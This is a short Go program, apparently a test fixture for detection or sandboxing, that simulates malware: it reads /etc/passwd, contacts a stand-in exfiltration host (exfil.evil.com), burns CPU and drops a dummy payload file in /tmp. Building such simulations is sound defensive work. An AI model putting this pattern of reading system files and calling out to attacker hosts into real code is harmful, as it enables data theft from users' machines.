package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
    "time"
)

func main() {
    fmt.Println("[+] Dummy Malicious Binary Started.")
    sensitiveFile := "/etc/passwd"
    content, err := ioutil.ReadFile(sensitiveFile)
    if err == nil {
        fmt.Printf("[*] Read sensitive file: %s...\n", content[:50])
    }
    targetURL := "http://exfil.evil.com/upload"
    fmt.Printf("[*] Attempting to connect to %s...\n", targetURL)
    _, err = http.Get(targetURL)
    if err != nil {
        fmt.Printf("[-] Failed to connect: %v\n", err)
    }
    fmt.Println("[*] Simulating high CPU usage for 10 seconds...")
    startTime := time.Now()
    for time.Since(startTime) < 10*time.Second {
        for i := 0; i < 1000000; i++ {
            _ = i * i
        }
    }
    fmt.Println("[*] High CPU simulation finished.")
    payloadFile := "/tmp/dummy_payload.txt"
    ioutil.WriteFile(payloadFile, []byte("dummy payload\n"), 0644)
    fmt.Printf("[*] Wrote dummy payload to %s.\n", payloadFile)
    fmt.Println("[+] Dummy Malicious Binary Finished.")
}